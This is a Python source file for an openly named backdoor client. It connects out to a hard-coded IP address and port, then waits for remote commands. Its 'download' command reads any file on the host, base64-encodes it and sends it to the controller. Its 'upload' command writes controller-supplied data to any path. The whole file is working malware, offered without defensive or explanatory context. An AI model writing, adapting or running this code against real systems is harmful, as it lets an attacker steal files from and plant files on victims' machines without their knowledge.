import socket
import base64
import simplejson

class BackdoorClient:
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_connection.connect((ip, port))

    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def get_file_contents(self, path):
        with open(path, "rb") as my_file:
            return base64.b64encode(my_file.read())

    def save_file(self, path, content):
        with open(path, "wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download OK"

    def start_socket(self):
        while True:
            command = self.json_receive()
            try:
                if command[0] == "quit":
                    self.my_connection.close()
                    exit()
                elif command[0] == "download":
                    command_output = self.get_file_contents(command[1])
                elif command[0] == "upload":
                    command_output = self.save_file(command[1], command[2])
                else:
                    command_output = "Unsupported Command"
            except Exception:
                command_output = "Error!"
            self.json_send(command_output)

backdoorclient = BackdoorClient("10.0.1.37", 8080)
backdoorclient.start_socket()
